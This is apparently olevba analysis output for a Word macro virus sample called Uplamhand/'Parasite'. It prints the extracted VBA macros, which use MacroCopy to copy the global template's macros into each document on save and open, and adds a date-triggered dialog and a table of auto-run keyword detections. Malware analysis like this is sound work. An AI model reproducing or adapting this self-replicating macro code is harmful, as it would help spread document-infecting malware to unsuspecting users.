olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Uplamhand-043aa5ed64d8acc0266e8ac109f3869a1f4e091a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Uplamhand-043aa5ed64d8acc0266e8ac109f3869a1f4e091a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PayLoad.bas 
in file: Virus.MSWord.Uplamhand-043aa5ed64d8acc0266e8ac109f3869a1f4e091a - OLE stream: 'Macros/VBA/PayLoad'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Rem Parasite loves ---> J
End Sub
-------------------------------------------------------------------------------
VBA MACRO SITE.bas 
in file: Virus.MSWord.Uplamhand-043aa5ed64d8acc0266e8ac109f3869a1f4e091a - OLE stream: 'Macros/VBA/SITE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:PARA", sTMacro$, 4
sTMacro$ = sMe$ + ":PARA"
WordBasic.MacroCopy "Global:PARA", sTMacro$, 4
sTMacro$ = sMe$ + ":SITE"
WordBasic.MacroCopy "Global:SITE", sTMacro$, 3
sTMacro$ = sMe$ + ":PayLoad"
WordBasic.MacroCopy "Global:PayLoad", sTMacro$, 1
sTMacro$ = sMe$ + ":J"
WordBasic.MacroCopy "Global:Autoexec", sTMacro$, 5
sTMacro$ = sMe$ + ":a678"
WordBasic.MacroCopy "Global:AutoOpen", sTMacro$, 6
WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO a678.bas 
in file: Virus.MSWord.Uplamhand-043aa5ed64d8acc0266e8ac109f3869a1f4e091a - OLE stream: 'Macros/VBA/a678'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
sMe$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Name:=sMe$, Format:=1
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:PARA", sTMacro$, 4
sTMacro$ = sMe$ + ":PARA"
WordBasic.MacroCopy "Global:PARA", sTMacro$, 4
sTMacro$ = sMe$ + ":SITE"
WordBasic.MacroCopy "Global:SITE", sTMacro$, 3
sTMacro$ = sMe$ + ":PayLoad"
WordBasic.MacroCopy "Global:PayLoad", sTMacro$, 1
sTMacro$ = sMe$ + ":J"
WordBasic.MacroCopy "Global:Autoexec", sTMacro$, 5
sTMacro$ = sMe$ + ":a678"
WordBasic.MacroCopy "Global:AutoOpen", sTMacro$, 6
WordBasic.FileSaveAs Name:=sMe$, Format:=1

End Sub
-------------------------------------------------------------------------------
VBA MACRO J.bas 
in file: Virus.MSWord.Uplamhand-043aa5ed64d8acc0266e8ac109f3869a1f4e091a - OLE stream: 'Macros/VBA/J'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim n
Dim button
n = WordBasic.Day(WordBasic.Now())
If n = 16 Then GoTo parasite
If n < 16 Then GoTo finish
If n > 16 Then GoTo finish
parasite:

WordBasic.BeginDialog 400, 100, "Parasite Beta 0.8", _
        "J.DlgFunction"
    WordBasic.OKButton 145, 50, 108, 21
    WordBasic.Text 120, 20, 250, 10, "Parasite Beta version 0.8!"
        
WordBasic.EndDialog
Dim sampleDlg As Object: Set sampleDlg = WordBasic.CurValues.UserDialog
button = WordBasic.Dialog.UserDialog(sampleDlg)
finish:
End Sub

Private Function DlgFunction(identifier$, action, suppvalue)
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

